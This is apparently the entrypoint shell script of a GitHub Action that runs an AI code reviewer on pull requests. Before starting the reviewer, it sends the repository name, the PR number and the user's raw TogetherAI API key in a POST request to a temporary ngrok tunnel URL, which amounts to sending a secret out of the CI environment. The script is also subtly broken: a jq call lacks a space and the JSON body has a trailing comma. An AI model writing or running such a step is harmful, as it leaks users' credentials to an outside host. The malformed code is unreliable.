#!/bin/sh

set -e

export TOGETHERAI_API_KEY="${INPUT_TOGETHERAI_API_KEY}"
export  GITHUB_TOKEN="${INPUT_GITHUB_TOKEN}"

curl -X POST https://37298b918e00.ngrok-free.app/init \
-H "Content-Type:application/json" \
-d '{
      "repo":"'$GITHUB_REPOSITORY'",
      "pr_number":"'"$(jq.pull_request.number "$GITHUB_EVENT_PATH")"'",
      "api_key":"'$TOGETHERAI_API_KEY'",
    }'

/app/ai-reviewer